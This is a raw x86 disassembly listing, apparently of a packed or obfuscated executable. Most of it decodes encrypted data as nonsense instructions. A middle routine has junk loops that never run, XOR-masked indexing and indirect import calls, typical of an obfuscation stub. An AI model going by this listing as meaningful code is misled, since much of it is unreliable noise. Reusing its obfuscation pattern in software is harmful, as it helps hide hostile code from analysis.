  42cf9b:	jmp    0xae28cd81
  42cfa0:	xlat   BYTE PTR ds:[ebx]
  42cfa1:	rcl    bl,cl
  42cfa3:	lods   al,BYTE PTR ds:[esi]
  42cfa4:	loopne 0x42cf6e
  42cfa6:	repz fdivr DWORD PTR [edi-0x283b2c32]
  42cfad:	add    edx,esp
  42cfaf:	shl    cl,1
  42cfb1:	loop   0x42cf75
  42cfb3:	repz xlat BYTE PTR ds:[ebx]
  42cfb5:	lock shl bl,1
  42cfb8:	out    dx,al
  42cfb9:	cld    
  42cfba:	pop    es
  42cfbb:	add    ch,ch
  42cfbd:	leave  
  42cfbe:	icebp  
  42cfbf:	mov    al,0xe7
  42cfc1:	fisubr WORD PTR [edi-0x4a171a15]
  42cfc7:	(bad)  
  42cfc9:	imul   cl
  42cfcb:	out    dx,al
  42cfcc:	loop   0x42cfad
  42cfce:	idiv   al
  42cfd0:	mov    eax,0x4d1c1f2
  42cfd5:	or     edi,DWORD PTR [edi-0x2fcfa15]
  42cfdb:	out    dx,eax
  42cfdc:	in     eax,dx
  42cfdd:	fyl2x  
  42cfdf:	mov    eax,0xaeaff2b3
  42cfe4:	lods   eax,DWORD PTR ds:[esi]
  42cfe5:	jmp    0xcd36a9ca
  42cfea:	int    0xe9
  42cfec:	enter  0xf9ef,0xf3
  42cff0:	(bad)  
  42cff2:	clc    
  42cff3:	rcl    ecx,0xe7
  42cff6:	lock loopne 0x42cfc0
  42cff9:	add    eax,0x7ccfd01
  42cffe:	shr    eax,cl
  42d000:	in     eax,0xb3
  42d002:	into   
  42d003:	lock mov cl,0xb5
  42d006:	retf   0xfbd2
  42d009:	mov    ebx,0xe8efd1f2
  42d00e:	loope  0x42cfcd
  42d010:	add    edi,ecx
  42d012:	rcl    cl,0xdb
  42d015:	cmc    
  42d016:	(bad)  
  42d017:	or     bl,bl
  42d019:	cmc    
  42d01a:	fiadd  DWORD PTR [ebx]
  42d01c:	dec    eax
  42d01e:	fptan  
  42d020:	lds    edi,FWORD PTR [esi-0x3b16374a]
  42d026:	les    esi,FWORD PTR [ebp-0x4d37294f]
  42d02c:	leave  
  42d02d:	mov    al,0xf5
  42d02f:	idiv   BYTE PTR [ebp-0x3d2e0c2a]
  42d035:	add    edx,edi
  42d037:	fiadd  DWORD PTR ds:0xe3f407d5
  42d03d:	(bad)  
  42d03e:	jmp    0xe635b001
  42d043:	sar    BYTE PTR [ebx-0x1149183a],0xfd
  42d04a:	out    dx,eax
  42d04b:	mov    edi,0xe0e9ecde
  42d050:	lock mov edi,0xe7c1f5e1
  42d056:	clc    
  42d057:	or     al,cl
  42d059:	add    eax,0xcbff0ee5
  42d05e:	call   0xcbf69c09
  42d063:	(bad)  [ecx-0x28382554]
  42d069:	test   esp,0xf5bdfefa
  42d06f:	in     al,dx
  42d070:	fiadd  DWORD PTR [ecx]
  42d072:	pop    es
  42d073:	add    dl,dl
  42d075:	fst    st(6)
  42d077:	pminsw mm1,QWORD PTR [edx]
  42d07a:	add    ebp,edi
  42d07c:	std    
  42d07d:	jecxz  0x42d065
  42d07f:	ret    0xc0bc
  42d082:	retf   
  42d083:	leave  
  42d084:	jmp    0x42d06a
  42d086:	jmp    0x2fb:0xfaf4fbef
  42d08d:	rol    BYTE PTR [edx],cl
  42d08f:	repz (bad) 
  42d092:	clc    
  42d093:	(bad)  
  42d094:	jmp    0xfeea:0xe3c2fdc0
  42d09b:	or     al,0x9
  42d09d:	(bad)  
  42d09e:	jmp    0xbe12985b
  42d0a3:	in     eax,0xf6
  42d0a5:	aad    0xd4
  42d0a7:	xlat   BYTE PTR ds:[ebx]
  42d0a8:	repz mov ch,0xec
  42d0ab:	(bad)  
  42d0ac:	(bad)  
  42d0ad:	mov    edi,0xedba03
  42d0b2:	rcl    ch,cl
  42d0b4:	repz mov eax,0xdcfdd9e3
  42d0ba:	stc    
  42d0bb:	stc    
  42d0bc:	fldl2t 
  42d0be:	(bad)  
  42d0bf:	lods   eax,DWORD PTR ds:[esi]
  42d0c0:	lock lock in eax,dx
  42d0c3:	mov    ah,0xc8
  42d0c5:	mov    edx,0xcfc8ccf1
  42d0ca:	fsubr  st,st(4)
  42d0cc:	jmp    0x42d0d0
  42d0ce:	fcmovu st,st(3)
  42d0d0:	fcmovu st,st(5)
  42d0d2:	lds    eax,FWORD PTR [edi]
  42d0d4:	mov    ecx,0xfffffef2
  42d0d9:	(bad)  
  42d0db:	int    0xea
  42d0dd:	add    eax,ebx
  42d0df:	loop   0x42d09f
  42d0e1:	mov    ebp,0xc1b2c5b7
  42d0e6:	test   dl,0xec
  42d0e9:	sar    ecx,cl
  42d0eb:	mov    esi,0xeed6e3ce
  42d0f0:	into   
  42d0f1:	frstpm(287 only) 
  42d0f3:	hlt    
  42d0f4:	hlt    
  42d0f5:	mov    eax,0x7e4f7bf
  42d0fa:	aam    0xd8
  42d0fc:	into   
  42d0fd:	icebp  
  42d0fe:	fldcw  WORD PTR [edi-0x14293c18]
  42d104:	out    dx,al
  42d105:	loopne 0x42d0ee
  42d107:	mov    dh,0xe4
  42d109:	leave  
  42d10a:	in     al,0xed
  42d10c:	aad    0xdb
  42d10e:	sar    bl,cl
  42d110:	add    ah,al
  42d112:	mov    esi,0xf1cbe4f2
  42d117:	out    0xd6,eax
  42d119:	frndint 
  42d11b:	(bad)  
  42d11c:	stc    
  42d11d:	cld    
  42d11e:	fnsave [edx-0x3c433658]
  42d124:	lods   al,BYTE PTR ds:[esi]
  42d125:	int3   
  42d126:	(bad)  
  42d127:	aad    0xf3
  42d129:	hlt    
  42d12a:	mov    ebp,0xcddef5f4
  42d12f:	mov    esi,0xd5fdb4f4
  42d134:	add    edx,ecx
  42d136:	(bad)
  42d13a:	fldlg2 
  42d13c:	jmp    esi
  42d13e:	mov    bl,0xae
  42d140:	retf   
  42d141:	scas   al,BYTE PTR es:[edi]
  42d142:	mov    bl,0xc2
  42d144:	shr    dh,cl
  42d146:	into   
  42d147:	cmc    
  42d148:	jmp    0xc4159f1f
  42d14d:	cmc    
  42d14e:	loop   0x42d10f
  42d150:	fdiv   st(3),st
  42d152:	hlt    
  42d153:	out    0xd4,eax
  42d155:	fild   WORD PTR [ebx]
  42d157:	cld    
  42d158:	std    
  42d159:	retf   0x904
  42d15c:	out    0xfa,eax
  42d15e:	shl    al,cl
  42d160:	(bad)  
  42d161:	into   
  42d162:	lock ror eax,0xb1
  42d166:	sti    
  42d167:	div    cl
  42d169:	imul   edx
  42d16b:	int3   
  42d16c:	in     eax,dx
  42d16d:	aad    0xc2
  42d16f:	mov    ecx,0xe2bfe3d4
  42d174:	(bad)  
  42d176:	loop   0x42d168
  42d178:	or     BYTE PTR [ebx],al
  42d17a:	wbinvd 
  42d17c:	retf   0xacef
  42d17f:	shl    dh,0xe4
  42d182:	mov    ebp,0xd2faacca
  42d187:	jmp    0xd62cb752
  42d18c:	fadd   QWORD PTR [ebx]
  42d18e:	cli    
  42d18f:	cld    
  42d190:	pop    es
  42d191:	int    0xd5
  42d193:	int3   
  42d194:	loope  0x42d18b
  42d196:	jmp    0x42d15f
  42d198:	call   0xd851aea1
  42d19d:	fnstcw WORD PTR [edx+esi*4-0x3a2c1238]
  42d1a4:	in     eax,dx
  42d1a5:	repz (bad) 
  42d1a8:	mov    edi,0xbaefc5eb
  42d1ad:	clc    
  42d1ae:	(bad)  
  42d1af:	out    0xc2,eax
  42d1b1:	rol    BYTE PTR [ecx],cl
  42d1b3:	add    esp,edx
  42d1b5:	icebp  
  42d1b6:	retf   0xfad4
  42d1b9:	push   es
  42d1ba:	aad    0x2
  42d1bc:	(bad)  [ebx]
  42d1be:	test   al,0xd2
  42d1c0:	(bad)
  42d1c3:	xlat   BYTE PTR ds:[ebx]
  42d1c4:	retf   
  42d1c5:	mov    bl,0xe7
  42d1c7:	mov    dh,0xb1
  42d1c9:	sar    cl,cl
  42d1cb:	mov    dl,0xcf
  42d1cd:	hlt    
  42d1ce:	shl    cl,cl
  42d1d0:	mov    esp,0xf1ddffe5
  42d1d5:	hlt    
  42d1d6:	fiadd  DWORD PTR [esi]
  42d1d8:	out    0xf4,al
  42d1da:	or     BYTE PTR ds:0xeee7f813,cl
  42d1e0:	mov    bh,0xc3
  42d1e2:	int3   
  42d1e3:	mov    ah,0xce
  42d1e5:	test   al,0xe1
  42d1e7:	mov    dh,0xcf
  42d1e9:	sar    DWORD PTR [edi-0x102d084c],cl
  42d1ef:	loop   0x42d1ef
  42d1f1:	loopne 0x42d1ae
  42d1f3:	aad    0xd0
  42d1f5:	hlt    
  42d1f6:	rcl    eax,0xe2
  42d1f9:	hlt    
  42d1fa:	pop    es
  42d1fb:	(bad)  
  42d1fd:	or     BYTE PTR [ecx-0x2d4c531c],dh
  42d203:	shl    bl,cl
  42d205:	hlt    
  42d206:	into   
  42d207:	mov    edx,0xbbb3c5da
  42d20c:	lock add dh,dh
  42d20f:	sti    
  42d210:	out    dx,eax
  42d211:	in     eax,0xe0
  42d213:	mov    esp,0xf7c9d6c5
  42d218:	or     al,al
  42d21a:	fsubrp st(3),st
  42d21c:	cld    
  42d21d:	std    
  42d21e:	loopne 0x42d1dc
  42d220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d221:	cmc    
  42d222:	loope  0x42d1f3
  42d224:	repnz mov edx,0xedeec4fa
  42d22a:	xlat   BYTE PTR ds:[ebx]
  42d22b:	(bad)  
  42d22c:	div    DWORD PTR [eax-0x12110e2a]
  42d232:	repnz rcl bh,cl
  42d235:	fst    st(7)
  42d237:	retf   
  42d238:	loope  0x42d219
  42d23a:	(bad)  
  42d23c:	dec    BYTE PTR [ebx+ebp*8]
  42d23f:	loop   0x42d20a
  42d241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d242:	ret    0xf3f6
  42d245:	xlat   BYTE PTR ds:[ebx]
  42d246:	retf   
  42d247:	(bad)  
  42d248:	sti    
  42d249:	out    dx,al
  42d24a:	iret   
  42d24b:	std    
  42d24c:	call   0xf725a42d
  42d251:	mov    esp,0x2f4ecf3
  42d256:	mov    BYTE PTR [esi],0x1
  42d259:	fucomi st,st(0)
  42d25b:	adc    ecx,eax
  42d25d:	out    0xe3,al
  42d25f:	jecxz  0x42d230
  42d261:	shl    esp,1
  42d263:	(bad)
  42d267:	hlt    
  42d268:	sti    
  42d269:	(bad)  
  42d26a:	int3   
  42d26b:	(bad)  
  42d26d:	mov    ebp,0xd8c2ddc8
  42d272:	in     al,dx
  42d273:	in     al,0x7
  42d275:	add    ecx,DWORD PTR [ecx]
  42d277:	out    0xc8,eax
  42d279:	pop    es
  42d27a:	enter  0xdae1,0xff
  42d27e:	loopne 0x42d265
  42d280:	mov    al,0xc2
  42d282:	bnd ret 
  42d284:	sti    
  42d285:	test   al,0xf8
  42d287:	test   ebp,0xf2cbf6d7
  42d28d:	add    ebx,ebx
  42d28f:	add    esp,ebx
  42d291:	add    al,bh
  42d293:	(bad)  
  42d295:	fdivr  st,st(2)
  42d297:	enter  0xee00,0xfe
  42d29b:	out    0xec,eax
  42d29d:	int3   
  42d29e:	mov    bl,0xce
  42d2a0:	(bad)  
  42d2a1:	lock not dl
  42d2a4:	mov    cl,0xb7
  42d2a6:	(bad)  
  42d2a7:	rcl    ebp,cl
  42d2a9:	rcr    esi,cl
  42d2ab:	(bad)  
  42d2ad:	add    dh,bl
  42d2af:	inc    edx
  42d2b1:	in     al,dx
  42d2b2:	aam    0xe7
  42d2b4:	mov    esp,0xfdec7c1
  42d2b9:	out    dx,eax
  42d2ba:	out    0xfe,eax
  42d2bc:	rcr    ecx,cl
  42d2be:	shl    edi,1
  42d2c0:	faddp  st(1),st
  42d2c2:	in     eax,dx
  42d2c3:	not    ebp
  42d2c5:	in     al,dx
  42d2c6:	(bad)  
  42d2c7:	test   eax,0xf8e9d9e4
  42d2cd:	int3   
  42d2ce:	add    edx,eax
  42d2d0:	(bad)  
  42d2d1:	test   esi,0xe3e1f2f7
  42d2d7:	rcl    ch,1
  42d2d9:	mov    ebp,0xc9f80fe7
  42d2df:	ret    0xaded
  42d2e2:	repz shr DWORD PTR [ecx+ebx*8-0x32402a25],1
  42d2ea:	shl    esi,1
  42d2ec:	mov    cl,0xf4
  42d2ee:	out    dx,eax
  42d2ef:	mov    edx,0xd9bbd7db
  42d2f4:	repnz or ecx,ebx
  42d2f7:	add    eax,DWORD PTR [ebx]
  42d2f9:	les    eax,FWORD PTR [ebx]
  42d2fb:	add    al,0x1
  42d2fd:	cld    
  42d2fe:	frstor [esi-0x1a2c491e]
  42d304:	leave  
  42d305:	iret   
  42d306:	aad    0xfa
  42d308:	mov    cl,0xca
  42d30a:	repnz shl DWORD PTR [edx+edi*8-0x19212f1e],1
  42d312:	mov    ebp,0xfcc3d7ff
  42d317:	jmp    0x228de17
  42d31c:	cld    
  42d31d:	fnstsw WORD PTR [eax-0x3021511d]
  42d323:	int    0xd6
  42d325:	cli    
  42d326:	iret   
  42d327:	loopne 0x42d323
  42d329:	out    dx,eax
  42d32a:	mov    ch,0xbd
  42d32c:	int    0xcd
  42d32e:	aam    0xd4
  42d330:	mov    esp,0xd5c1f9c7
  42d335:	add    ah,bl
  42d337:	push   es
  42d338:	out    0xe3,al
  42d33a:	fimul  WORD PTR [edi]
  42d33c:	or     eax,0xd7e0bfdf
  42d341:	scas   al,BYTE PTR es:[edi]
  42d342:	mov    dl,0xd5
  42d344:	out    dx,al
  42d345:	mov    ebx,0xb0f4c0c5
  42d34a:	int    0xd2
  42d34c:	repnz mov ecx,0xc3f6c1be
  42d352:	cli    
  42d353:	inc    BYTE PTR [esi]
  42d355:	cld    
  42d356:	icebp  
  42d357:	lock xlat BYTE PTR ds:[ebx]
  42d359:	fprem  
  42d35b:	pop    es
  42d35c:	faddp  st(4),st
  42d35e:	scas   al,BYTE PTR es:[edi]
  42d35f:	mov    al,0xb1
  42d361:	enter  0xb1ce,0xf1
  42d365:	iret   
  42d366:	in     al,dx
  42d367:	push   DWORD PTR [esi-0x46270c14]
  42d36d:	fcmovb st,st(3)
  42d36f:	mov    ebp,0xe1c6d6ff
  42d374:	lock ret 
  42d376:	fiadd  WORD PTR [esi+edi*8]
  42d379:	or     eax,0xcd06c5cb
  42d37e:	mov    ecx,0xafc5a5f3
  42d383:	aam    0xe0
  42d385:	mov    edx,0xf9def7f0
  42d38a:	cmc    
  42d38b:	mov    ch,0xba
  42d38d:	in     eax,dx
  42d38e:	sar    DWORD PTR [edi-0x423d0b27],0xcb
  42d395:	push   es
  42d396:	clc    
  42d397:	(bad)  
  42d398:	(bad)  
  42d39a:	fld    QWORD PTR [ebx]
  42d39c:	in     al,0xc
  42d39e:	(bad)
  42d3a2:	mov    bh,0xe6
  42d3a4:	out    0xcb,eax
  42d3a6:	mov    cl,0xed
  42d3a8:	out    dx,al
  42d3a9:	mov    esi,0xcdd0ebd4
  42d3ae:	ret    
  42d3af:	shl    DWORD PTR [ebp-0x231c4027],0xcb
  42d3b6:	les    eax,FWORD PTR [edi]
  42d3b8:	fmul   st(7),st
  42d3ba:	int    0x8
  42d3bc:	into   
  42d3bd:	in     al,0xaf
  42d3bf:	lods   eax,DWORD PTR ds:[esi]
  42d3c0:	shl    ecx,0xeb
  42d3c3:	out    0xf2,al
  42d3c5:	(bad)  
  42d3c6:	hlt    
  42d3c7:	mov    ch,0xf7
  42d3c9:	retf   
  42d3ca:	(bad)  
  42d3cb:	sti    
  42d3cc:	inc    dl
  42d3ce:	fnstcw WORD PTR [ebp+0x6f1e301]
  42d3d4:	aad    0xa
  42d3d6:	fidivr DWORD PTR [esi+0xaefcbbd]
  42d3dc:	or     dl,bh
  42d3de:	icebp  
  42d3df:	jmp    0x42d3aa
  42d3e1:	shr    esi,0xc2
  42d3e4:	mov    ch,0xea
  42d3e6:	call   0xf12eaa9d
  42d3eb:	cmc    
  42d3ec:	fucomip st,st(4)
  42d3ee:	enter  0xc1dd,0x8b
  42d3f2:	dec    ebp
  42d3f3:	clc    
  42d3f4:	mov    al,BYTE PTR [ecx+eax*1+0x3272fb]
  42d3fb:	mov    BYTE PTR [ebp-0x25],al
  42d3fe:	mov    eax,DWORD PTR [ebp+0xc]
  42d401:	xor    eax,0x75108b5
  42d406:	mov    ecx,DWORD PTR [ebp+0x8]
  42d409:	xor    ecx,0x75108b5
  42d40f:	mov    edx,DWORD PTR [ebp-0x8]
  42d412:	mov    esi,DWORD PTR [ebp-0x8]
  42d415:	mov    al,BYTE PTR [esi+eax*1+0x3272fb]
  42d41c:	mov    BYTE PTR [edx+ecx*1+0x3272fb],al
  42d423:	mov    eax,DWORD PTR [ebp+0xc]
  42d426:	xor    eax,0x75108b5
  42d42b:	mov    ecx,DWORD PTR [ebp-0x8]
  42d42e:	mov    dl,BYTE PTR [ebp-0x25]
  42d431:	mov    BYTE PTR [ecx+eax*1+0x3272fb],dl
  42d438:	mov    eax,DWORD PTR [ebp+0xc]
  42d43b:	xor    eax,0x75108b5
  42d440:	add    eax,0x3272fb
  42d445:	pop    esi
  42d446:	leave  
  42d447:	ret    0x10
  42d44a:	push   ebp
  42d44b:	mov    ebp,esp
  42d44d:	sub    esp,0xa0
  42d453:	mov    eax,ds:0x43739f
  42d458:	adc    ecx,DWORD PTR ds:0x43775b
  42d45e:	mov    DWORD PTR [ebp-0x2c],eax
  42d461:	lea    eax,[ebp-0x3c]
  42d464:	mov    DWORD PTR [ebp-0x28],eax
  42d467:	mov    DWORD PTR ds:0x437763,0x13
  42d471:	cmp    DWORD PTR ds:0x437763,0x0
  42d478:	je     0x42d4c5
  42d47e:	cmp    DWORD PTR ds:0x437763,0x5
  42d485:	jle    0x42d4c5
  42d48b:	jmp    0x42d499
  42d490:	push   DWORD PTR [ebp-0x1c]
  42d493:	call   DWORD PTR ds:0x43c998
  42d499:	cmp    DWORD PTR ds:0x437763,0x6
  42d4a0:	jne    0x42d4b3
  42d4a6:	mov    ecx,DWORD PTR ds:0x437763
  42d4ac:	dec    ecx
  42d4ad:	mov    DWORD PTR ds:0x437763,ecx
  42d4b3:	mov    ecx,DWORD PTR ds:0x437763
  42d4b9:	dec    ecx
  42d4ba:	mov    DWORD PTR ds:0x437763,ecx
  42d4c0:	jmp    0x42d471
  42d4c5:	mov    eax,DWORD PTR [ebp-0x28]
  42d4c8:	and    DWORD PTR ds:0x437713,0x0
  42d4d2:	xor    ecx,ecx
  42d4d4:	add    ecx,DWORD PTR ds:0x437713
  42d4da:	inc    ecx
  42d4db:	mov    DWORD PTR ds:0x437713,ecx
  42d4e1:	cmp    DWORD PTR ds:0x437713,0x2a
  42d4e8:	jl     0x42d514
  42d4ee:	jmp    0x42d507
  42d4f3:	push   DWORD PTR [ebp-0x1c]
  42d4f6:	push   DWORD PTR [ebp-0x20]
  42d4f9:	push   0x43779f
  42d4fe:	push   DWORD PTR [ebp-0x24]
  42d501:	call   DWORD PTR ds:0x43c99c
  42d507:	cmp    DWORD PTR ds:0x437713,0x1e
  42d50e:	jb     0x42d4d2
  42d514:	mov    ecx,DWORD PTR ds:0x4374bf
  42d51a:	adc    DWORD PTR ds:0x437727,0x6e64
  42d524:	mov    DWORD PTR [eax],ecx
  42d526:	adc    ecx,DWORD PTR ds:0x43772f
  42d52c:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  42d533:	adc    DWORD PTR ds:0x437733,ebx
  42d539:	mov    DWORD PTR [ebp-0x90],0xf89c85b3
  42d543:	xor    eax,eax
  42d545:	lea    eax,[ebp-0x4]
  42d548:	adc    DWORD PTR ds:0x43777f,0x7eae
  42d552:	mov    DWORD PTR [ebp-0x18],eax
  42d555:	mov    eax,DWORD PTR [ebp-0x18]
  42d558:	or     ecx,DWORD PTR ds:0x437727
  42d55e:	mov    eax,DWORD PTR [eax]
  42d560:	xor    ecx,ecx
  42d562:	xor    ecx,DWORD PTR ds:0x4377cb
  42d568:	mov    ecx,DWORD PTR [ecx]
  42d56a:	add    DWORD PTR ds:0x43778f,ecx
  42d570:	mov    ecx,DWORD PTR [ebp-0x4]
  42d573:	sub    eax,ecx
  42d575:	mov    ecx,DWORD PTR [ebp-0x18]
  42d578:	mov    DWORD PTR ds:0x437717,0x6eff
  42d582:	mov    DWORD PTR [ecx],eax
  42d584:	xor    eax,DWORD PTR ds:0x43771f
  42d58a:	mov    eax,DWORD PTR [ebp-0x18]
  42d58d:	dec    DWORD PTR ds:0x437737
  42d593:	mov    eax,DWORD PTR [eax]
  42d595:	inc    ecx
  42d596:	xor    eax,0xf89cb5b0
  42d59b:	mov    ecx,DWORD PTR [ebp-0x18]
  42d59e:	adc    DWORD PTR ds:0x43772b,0x999
  42d5a8:	mov    DWORD PTR [ecx],eax
  42d5aa:	mov    DWORD PTR ds:0x437753,0x18
  42d5b4:	cmp    DWORD PTR ds:0x437753,0x0
  42d5bb:	je     0x42d600
  42d5c1:	cmp    DWORD PTR ds:0x437753,0x21
  42d5c8:	jb     0x42d600
  42d5ce:	jmp    0x42d5ec
  42d5d3:	push   0x76ac
  42d5d8:	push   0x2657
  42d5dd:	push   DWORD PTR [ebp-0x14]
  42d5e0:	push   DWORD PTR [ebp-0x28]
  42d5e3:	push   DWORD PTR [ebp-0x24]
  42d5e6:	call   DWORD PTR ds:0x43c9a0
  42d5ec:	xor    ecx,ecx
  42d5ee:	or     ecx,DWORD PTR ds:0x437753
  42d5f4:	dec    ecx
  42d5f5:	mov    DWORD PTR ds:0x437753,ecx
  42d5fb:	jmp    0x42d5b4
  42d600:	lea    eax,[ebp-0x8]
  42d603:	mov    DWORD PTR ds:0x437787,0x1b
  42d60d:	cmp    DWORD PTR ds:0x437787,0x0
  42d614:	je     0x42d64e
  42d61a:	cmp    DWORD PTR ds:0x437787,0x23
  42d621:	jl     0x42d64e
  42d627:	jmp    0x42d63a
  42d62c:	push   0x8dd4
  42d631:	push   DWORD PTR [ebp-0x18]
  42d634:	call   DWORD PTR ds:0x43c9a4
  42d63a:	xor    ecx,ecx
  42d63c:	xor    ecx,DWORD PTR ds:0x437787
  42d642:	dec    ecx
  42d643:	mov    DWORD PTR ds:0x437787,ecx
  42d649:	jmp    0x42d60d
  42d64e:	mov    DWORD PTR [ebp-0x14],eax
  42d651:	not    eax
  42d653:	mov    eax,DWORD PTR [ebp-0x14]
  42d656:	xor    DWORD PTR ds:0x43774b,ecx
  42d65c:	mov    eax,DWORD PTR [eax]
  42d65e:	xor    DWORD PTR ds:0x43779b,edi
  42d664:	mov    ecx,DWORD PTR [ebp-0x8]
  42d667:	neg    DWORD PTR ds:0x4377b3
  42d66d:	sub    eax,ecx
  42d66f:	and    ecx,DWORD PTR ds:0x43775f
  42d675:	mov    ecx,DWORD PTR [ebp-0x14]
  42d678:	mov    DWORD PTR [ecx],eax
  42d67a:	adc    eax,DWORD PTR ds:0x43771b
  42d680:	mov    eax,DWORD PTR [ebp-0x14]
  42d683:	mov    DWORD PTR ds:0x437757,0x10
  42d68d:	cmp    DWORD PTR ds:0x437757,0x0
  42d694:	je     0x42d6d0
  42d69a:	cmp    DWORD PTR ds:0x437757,0x12
  42d6a1:	jge    0x42d6d0
  42d6a7:	jmp    0x42d6bc
  42d6ac:	push   0x155c
  42d6b1:	push   0x7a14
  42d6b6:	call   DWORD PTR ds:0x43c9a8
  42d6bc:	xor    ecx,ecx
  42d6be:	xor    ecx,DWORD PTR ds:0x437757
  42d6c4:	dec    ecx
  42d6c5:	mov    DWORD PTR ds:0x437757,ecx
  42d6cb:	jmp    0x42d68d
  42d6d0:	mov    eax,DWORD PTR [eax]
  42d6d2:	and    DWORD PTR ds:0x43775b,0x0
  42d6dc:	xor    ecx,ecx
  42d6de:	or     ecx,DWORD PTR ds:0x43775b
  42d6e4:	inc    ecx
  42d6e5:	mov    DWORD PTR ds:0x43775b,ecx
  42d6eb:	cmp    DWORD PTR ds:0x43775b,0x1e
  42d6f2:	jb     0x42d71a
  42d6f8:	jmp    0x42d70d
  42d6fd:	push   0x43775b
  42d702:	push   0x3fc2
  42d707:	call   DWORD PTR ds:0x43c9ac
  42d70d:	cmp    DWORD PTR ds:0x43775b,0x14
  42d714:	jb     0x42d6dc
  42d71a:	or     eax,0xf89f05b0
  42d71f:	and    DWORD PTR ds:0x437763,0x0
  42d729:	mov    ecx,DWORD PTR ds:0x437763
  42d72f:	inc    ecx
  42d730:	mov    DWORD PTR ds:0x437763,ecx
  42d736:	cmp    DWORD PTR ds:0x437763,0x1d
  42d73d:	jg     0x42d763
  42d743:	jmp    0x42d756
  42d748:	push   DWORD PTR [ebp-0x24]
  42d74b:	push   0x79a8
  42d750:	call   DWORD PTR ds:0x43c9b0
  42d756:	cmp    DWORD PTR ds:0x437763,0x12
  42d75d:	jb     0x42d729
  42d763:	mov    ecx,DWORD PTR [ebp-0x14]
  42d766:	adc    DWORD PTR ds:0x43778f,0x4377ab
  42d770:	mov    DWORD PTR [ecx],eax
  42d772:	sub    ecx,DWORD PTR ds:0x43779f
  42d778:	lea    eax,[ebp-0x10]
  42d77b:	mov    DWORD PTR [ebp-0x8c],eax
  42d781:	and    DWORD PTR ds:0x437743,0x0
  42d78b:	mov    eax,ds:0x437743
  42d790:	inc    eax
  42d791:	mov    ds:0x437743,eax
  42d796:	cmp    DWORD PTR ds:0x437743,0x24
  42d79d:	jbe    0x42d7ca
  42d7a3:	jmp    0x42d7bd
  42d7a8:	push   0x43778f
  42d7ad:	push   0x43778f
  42d7b2:	push   0x7a81
  42d7b7:	call   DWORD PTR ds:0x43c9b4
  42d7bd:	cmp    DWORD PTR ds:0x437743,0x18
  42d7c4:	jb     0x42d78b
  42d7ca:	mov    eax,DWORD PTR [ebp-0x8c]
  42d7d0:	sub    DWORD PTR ds:0x437777,ecx
  42d7d6:	mov    eax,DWORD PTR [eax]
  42d7d8:	neg    ecx
  42d7da:	mov    ecx,DWORD PTR [ebp-0x10]
  42d7dd:	sub    DWORD PTR ds:0x43772f,0x437757
  42d7e7:	sub    eax,ecx
  42d7e9:	mov    ecx,DWORD PTR [ebp-0x8c]
  42d7ef:	mov    DWORD PTR [ecx],eax
  42d7f1:	mov    eax,DWORD PTR [ebp-0x8c]
  42d7f7:	mov    eax,DWORD PTR [eax]
  42d7f9:	or     eax,0xf89c85f0
  42d7fe:	mov    ecx,DWORD PTR [ebp-0x8c]
  42d804:	mov    DWORD PTR [ecx],eax
  42d806:	lea    eax,[ebp-0x24]
  42d809:	mov    DWORD PTR [ebp-0x34],eax
  42d80c:	mov    eax,DWORD PTR [ebp-0x34]
  42d80f:	mov    eax,DWORD PTR [eax]
  42d811:	mov    ecx,DWORD PTR [ebp-0x24]
  42d814:	sub    eax,ecx
  42d816:	mov    ecx,DWORD PTR [ebp-0x34]
  42d819:	mov    DWORD PTR [ecx],eax
  42d81b:	mov    eax,DWORD PTR [ebp-0x34]
  42d81e:	mov    eax,DWORD PTR [eax]
  42d820:	or     eax,0xf89c8590
  42d825:	jmp    0x42fbb7
  42d82a:	out    0xea,al
  42d82c:	sub    edx,DWORD PTR [ebx-0x1199adc9]
  42d832:	add    eax,0xd6e63064
  42d837:	push   esi
  42d838:	js     0x42d893
  42d83a:	or     dh,dh
  42d83c:	jns    0x42d8b9
  42d83e:	out    dx,al
  42d83f:	cwde   
  42d840:	jnp    0x42d8bd
  42d842:	fadd   DWORD PTR [esi]
  42d844:	ret    
  42d845:	add    DWORD PTR [eax],eax
  42d847:	leave  
  42d848:	(bad)  
  42d849:	(bad)  
  42d84a:	fimul  WORD PTR [ecx]
  42d84c:	leave  
  42d84d:	iret   
  42d84e:	shr    dh,0xf0
  42d851:	(bad)  
  42d852:	repnz scas al,BYTE PTR es:[edi]
  42d854:	mov    bl,0xe3
  42d856:	icebp  
  42d857:	in     al,0xe0
  42d859:	mov    bh,0xd8
  42d85b:	icebp  
  42d85c:	repz (bad) 
  42d85f:	clc    
  42d860:	repz out dx,eax
  42d862:	sar    ebx,1
  42d864:	fcmovu st,st(7)
  42d866:	out    0xe7,eax
  42d868:	or     edi,ebx
  42d86a:	add    eax,0xc9e006e4
  42d86f:	mov    esi,0xb2e3e1c2
  42d874:	iret   
  42d875:	jmp    0xdcec:0xfbcdf7ef
  42d87c:	(bad)  
  42d87d:	repz cli 
  42d87f:	call   0xf5188e7a
  42d884:	test   edi,0xfbbee8d6
  42d88a:	out    dx,al
  42d88b:	fld    QWORD PTR [eax]
  42d88d:	loopne 0x42d85c
  42d88f:	mov    ebp,0xf7e3d6c6
  42d894:	mov    al,0xe8
  42d896:	in     eax,0xee
  42d898:	fucomip st,st(4)
  42d89a:	mov    ecx,0xe8fec9c4
  42d89f:	aam    0xd0
  42d8a1:	ret    
  42d8a2:	sar    ch,0xc6
  42d8a5:	fild   WORD PTR [ecx]
  42d8a7:	add    ebx,ebp
  42d8a9:	loop   0x42d8a6
  42d8ab:	hlt    
  42d8ac:	or     eax,DWORD PTR [ebx]
  42d8ae:	add    DWORD PTR [eax-0x141f0f4e],ebp
  42d8b4:	out    dx,al
  42d8b5:	fcomi  st,st(1)
  42d8b7:	rcr    bh,cl
  42d8b9:	(bad)  
  42d8ba:	mov    ch,0xd3
  42d8bc:	out    dx,al
  42d8bd:	(bad)  
  42d8be:	fnstcw WORD PTR [edx-0x22282126]
  42d8c4:	fadd   st,st(6)
  42d8c6:	add    DWORD PTR [ebx],eax
  42d8c8:	lock out dx,al
  42d8ca:	aam    0xe8
  42d8cc:	jmp    0x42d8cd
  42d8ce:	shl    DWORD PTR [edx-0x4d481633],cl
  42d8d4:	(bad)  
  42d8d5:	jmp    0xdf1b93a3
  42d8da:	lock shl ebx,1
  42d8dd:	int3   
  42d8de:	mov    esp,0xc1f8fbdb
  42d8e3:	stc    
  42d8e4:	(bad)  
  42d8e6:	test   esp,0xd9c6c1ea
  42d8ec:	in     al,0x9
